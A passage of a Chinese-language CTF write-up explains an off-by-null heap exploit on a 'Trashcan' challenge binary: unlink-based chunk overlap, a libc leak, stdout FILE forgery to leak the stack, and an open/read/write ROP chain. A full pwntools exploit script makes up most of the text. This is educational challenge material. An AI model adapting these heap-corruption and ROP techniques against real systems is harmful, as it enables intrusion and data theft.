   0x000015555517b0ef &lt;+79&gt;:    mov    r12,QWORD PTR [rdx+0x48]         
   0x000015555517b0f3 &lt;+83&gt;:    mov    r13,QWORD PTR [rdx+0x50]         
   0x000015555517b0f7 &lt;+87&gt;:    mov    r14,QWORD PTR [rdx+0x58]         
   0x000015555517b0fb &lt;+91&gt;:    mov    r15,QWORD PTR [rdx+0x60]         
   0x000015555517b0ff &lt;+95&gt;:    test   DWORD PTR fs:0x48,0x2            
</code></pre></td></tr></table>
</div>
</div><p>所以核心思路是off-by-null使chunk的inuse位置0，标志着前一个chunk使空闲的，导致在free当前chunk时触发unlink向前合并。在前一个块精心布局绕过unlink检查，我们就可以向前合并导致堆块重叠。可以直接动态调试绕过unlink检测。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">   0x1555551bba41 &lt;unlink_chunk.isra+33&gt;     cmp    rdi, qword ptr [rax + 0x18]                   
   0x1555551bba45 &lt;unlink_chunk.isra+37&gt;     jne    unlink_chunk.isra+160 &lt;unlink_chunk.isra+160&gt; 
                                                                                                  
 ► 0x1555551bba47 &lt;unlink_chunk.isra+39&gt;     cmp    rdi, qword ptr [rdx + 0x10]                   
   0x1555551bba4b &lt;unlink_chunk.isra+43&gt;     jne    unlink_chunk.isra+160 &lt;unlink_chunk.isra+160&gt; 

   0x1555551bbac0 &lt;unlink_chunk.isra+160&gt;    lea    rdi, [rip + 0x11f990]             
   0x1555551bbac7 &lt;unlink_chunk.isra+167&gt;    call   malloc_printerr &lt;malloc_printerr&gt;  # unlink 出错
</code></pre></td></tr></table>
</div>
</div><p>堆块合并拿到libc基址后，直接分配到environ去泄露stack地址，还是因为有个\x00</p>
<p>看来还得打stdout拿到栈地址，我们知道在IO FILE的flag为某些值时write_base到write_end会打印出来。所以打到stdout，利用write_base拿到栈地址。然后去做栈溢出。</p>
<p>这里发现stdout本身的flag不对，还得从头开始改，这样如果只改一半它在刚分配过去的时候会全部清零引发错误，所以必须得足够大的块一次性把整个stdout伪造出来(只把write指针全改也不行)</p>
<p>exp2.31，加上mask异或就能打远程。总的来说细节还是比较繁琐。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="s2">&#34;&#34;&#34; x1do0 / Lilac &#34;&#34;&#34;</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">endian</span> <span class="o">=</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
<span class="c1"># context.log_level = &#39;debug&#39;</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;splitw&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">,</span> <span class="s1">&#39;-p&#39;</span><span class="p">,</span> <span class="s1">&#39;75&#39;</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">choice</span><span class="p">(</span><span class="n">ch</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">ch</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">con</span><span class="p">):</span>
    <span class="n">choice</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Trashcan no.: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Size of your trash: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Your trash: &#34;</span><span class="p">,</span> <span class="n">con</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">change_size</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
    <span class="n">choice</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Trashcan no.: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Size of new trashcan:&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">choice</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Trashcan no.: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="n">debug</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
<span class="c1"># debug += &#34;b *0x43BB + 0x555555554000&#34;</span>
<span class="c1"># debug += &#34;\nset $data=0x55555555d4d0&#34;</span>
<span class="c1"># debug += &#34;\nb *0x1555551bba41&#34; # unlink check</span>
<span class="n">debug</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">b *0x46E5 + 0x555555554000&#34;</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./a.out&#34;</span><span class="p">)</span>

<span class="n">choice</span><span class="p">(</span><span class="mh">0x7A69</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;what happened</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">heap_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[*] heap addr : &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">))</span>

<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="s1">&#39;a</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="s1">&#39;c</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="s1">&#39;d</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="s1">&#39;b</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="n">change_size</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x1f8</span><span class="p">)</span> <span class="c1"># free the first chunk and get into unsortedbin</span>
<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">flat</span><span class="p">(</span><span class="mh">0xf1</span><span class="p">,</span> <span class="n">heap_addr</span><span class="o">+</span><span class="mh">0x40</span><span class="o">-</span><span class="mh">0x18</span><span class="p">,</span> <span class="n">heap_addr</span><span class="o">+</span><span class="mh">0x40</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_addr</span><span class="o">+</span><span class="mh">0x20</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="n">pay</span><span class="p">)</span>

<span class="n">change_size</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mh">0x1f8</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mh">0x58</span> <span class="p">,</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x50</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xf0</span><span class="p">))</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="s1">&#39;xd</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1"># 3-&gt;9</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">change_size</span><span class="p">(</span><span class="mi">3</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="mh">0x1f8</span><span class="p">)</span> <span class="c1"># 3-&gt;9 fill 0x200 tcache</span>

<span class="n">add</span><span class="p">(</span><span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">change_size</span><span class="p">(</span><span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x2f8</span><span class="p">)</span>


<span class="n">change_size</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x2f8</span><span class="p">)</span>

<span class="c1"># change_size(2, 0x2f8)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="s1">&#39;x</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./a.out&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">libc</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1ebbe0</span>
<span class="n">write_base</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x1ec6c0</span>
<span class="n">stdin</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x1eb980</span>
<span class="n">stack</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;environ&#39;</span><span class="p">]</span>
<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>


<span class="n">change_size</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mh">0x2f8</span><span class="p">)</span>

<span class="n">add</span><span class="p">(</span><span class="mi">13</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x41</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">write_base</span><span class="o">-</span><span class="mh">0x20</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span>

<span class="n">add</span><span class="p">(</span><span class="mi">14</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x141</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000015555530ebe0</span><span class="o">-</span><span class="mh">0x155555123000</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000015555530ebe0</span><span class="o">-</span><span class="mh">0x155555123000</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="n">add</span><span class="p">(</span><span class="mi">14</span><span class="p">,</span> <span class="mh">0x130</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="n">iofile</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span>
<span class="n">iofile</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="o">+</span><span class="mh">0x20</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="o">+</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">choice</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Trashcan no.:&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">14</span><span class="p">))</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Size of your trash:&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mh">0x50</span><span class="p">))</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">iofile</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">target</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">-</span><span class="mh">0x100</span>
<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>



<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x30</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;a</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x50</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;b</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x1f8</span><span class="p">,</span> <span class="s1">&#39;c</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="s1">&#39;b</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="c1"># for i in range(4):</span>
<span class="c1">#     add(3+i, 0x2f8, &#39;xd\n&#39;) # 3-&gt;9</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">change_size</span><span class="p">(</span><span class="mi">3</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="mh">0x2f8</span><span class="p">)</span> <span class="c1"># 3-&gt;9 fill 0x300 tcache</span>


<span class="n">add</span><span class="p">(</span><span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x50</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">change_size</span><span class="p">(</span><span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x3f8</span><span class="p">)</span>


<span class="n">change_size</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x3f8</span><span class="p">)</span>
<span class="n">fd</span> <span class="o">=</span> <span class="mh">0x555555572740</span> <span class="o">-</span> <span class="mh">0x55555556feb0</span> <span class="o">+</span> <span class="n">heap_addr</span> <span class="o">+</span><span class="mh">0x20</span> 
<span class="n">bk</span> <span class="o">=</span> <span class="mh">0x555555572740</span> <span class="o">-</span> <span class="mh">0x55555556feb0</span> <span class="o">+</span> <span class="n">heap_addr</span> <span class="o">+</span><span class="mh">0x20</span>
<span class="n">p_to_chunk</span> <span class="o">=</span> <span class="mh">0x555555572740</span> <span class="o">-</span> <span class="mh">0x55555556feb0</span> <span class="o">+</span> <span class="n">heap_addr</span>
<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk</span><span class="p">))</span>
<span class="n">change_size</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x3f8</span><span class="p">)</span>

<span class="c1"># gdb.attach(io, debug)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x50</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">p_to_chunk</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x30</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x70</span><span class="p">))</span>


<span class="n">change_size</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>

<span class="n">change_size</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x3f8</span><span class="p">)</span>


<span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x70</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x51</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">target</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="n">prdir</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x0000000000026b72</span>
<span class="n">prsir</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x0000000000027529</span>
<span class="n">prdxr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x0000000000162866</span> <span class="c1"># pop rdx ; pop rbx ; ret</span>
<span class="n">prspr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x0000000000032b5a</span>
<span class="n">syscall</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x0000000000066229</span> <span class="c1"># syscall ; ret</span>
<span class="n">praxr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x000000000004a550</span>
<span class="n">flag_addr</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="o">+</span> <span class="mh">0x1000</span>
<span class="n">read_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
<span class="n">open_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;open&#39;</span><span class="p">]</span> <span class="c1"># open64 is not permitted</span>
<span class="n">write_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
<span class="n">str_addr</span> <span class="o">=</span> <span class="mh">0x5555555727c0</span> <span class="o">-</span> <span class="mh">0x55555556feb0</span> <span class="o">+</span> <span class="n">heap_addr</span>
<span class="n">addr</span> <span class="o">=</span> <span class="mh">0x5555555717d0</span> <span class="o">-</span> <span class="mh">0x55555556feb0</span> <span class="o">+</span> <span class="n">heap_addr</span>

<span class="n">rop</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">prspr</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span> 
<span class="n">add</span><span class="p">(</span><span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="n">rop</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> 

<span class="n">rop2</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">prdir</span><span class="p">,</span> <span class="n">str_addr</span><span class="p">,</span> <span class="n">praxr</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">syscall</span><span class="p">,</span>
        <span class="n">prdir</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="n">prsir</span><span class="p">,</span> <span class="n">flag_addr</span><span class="p">,</span> <span class="n">prdxr</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">read_addr</span><span class="p">,</span>
        <span class="n">prdir</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">prsir</span><span class="p">,</span> <span class="n">flag_addr</span><span class="p">,</span> <span class="n">prdxr</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">write_addr</span><span class="p">)</span>

<span class="n">add</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x1f0</span><span class="p">,</span> <span class="n">rop2</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="s2">&#34;./flag.txt</span><span class="se">\x00\n</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;0&#34;</span><span class="p">)</span> 

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
